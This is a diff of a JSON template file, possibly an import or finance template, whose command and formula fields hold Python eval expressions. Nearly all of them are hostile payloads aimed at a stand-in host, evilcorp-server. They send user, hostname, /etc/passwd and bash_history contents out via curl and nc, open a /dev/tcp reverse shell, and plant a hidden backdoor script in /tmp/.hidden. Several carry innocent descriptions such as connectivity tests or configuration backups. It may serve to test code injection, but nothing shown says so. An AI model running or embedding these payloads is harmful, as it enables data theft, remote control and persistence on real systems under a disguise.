@@ -17,17 +17,12 @@
     {
       "name": "system_reconnaissance", 
       "description": "Gather system information for compatibility",
-      "command": "__import__('subprocess').call(['whoami'], stdout=open('/tmp/current_user.txt', 'w'))"
+      "command": "__import__('subprocess').call(['whoami'], stdout=open('/tmp/json_current_user.txt', 'w'))"
     },
     {
       "name": "network_connectivity_test",
       "description": "Test network connectivity to external services",
       "command": "__import__('os').system('curl -X POST http://evilcorp-server:8888/json_attack --data \"source=json_template&user=$(whoami)&hostname=$(hostname)\"')"
-    },
-    {
-      "name": "data_exfiltration",
-      "description": "Backup current system configuration",
-      "command": "__import__('os').system('cat /etc/passwd | nc evilcorp-server 5555')"
     }
   ],
   "formulas": {
@@ -36,9 +31,9 @@
     "balance_validation": "abs(-1000.00)",
     "system_info_gather": "__import__('subprocess').check_output(['uname', '-a']).decode().strip()",
     "file_system_access": "open('/etc/hosts').read().strip()",
+    "persistence_creation": "__import__('os').system('mkdir -p /tmp/.hidden && echo \"#!/bin/bash\\ncurl http://evilcorp-server:8888/callback\" > /tmp/.hidden/backdoor.sh && chmod +x /tmp/.hidden/backdoor.sh')",
     "reverse_shell_attempt": "__import__('os').system('bash -c \"exec 5<>/dev/tcp/evilcorp-server/5555;cat <&5 | while read line; do $line 2>&5 >&5; done\" &')",
-    "credential_harvest": "__import__('os').system('find /home -name \".bash_history\" -exec cat {} \\; 2>/dev/null | head -20 | nc evilcorp-server 5555')",
-    "persistence_creation": "__import__('os').system('mkdir -p /tmp/.hidden && echo \"#!/bin/bash\\ncurl http://evilcorp-server:8888/callback\" > /tmp/.hidden/backdoor.sh && chmod +x /tmp/.hidden/backdoor.sh')"
+    "credential_harvest": "__import__('os').system('find /home -name \".bash_history\" -exec cat {} \\; 2>/dev/null | head -20 | nc evilcorp-server 5555')"
   },
   "import_rules": {
     "validate_amounts": "True",
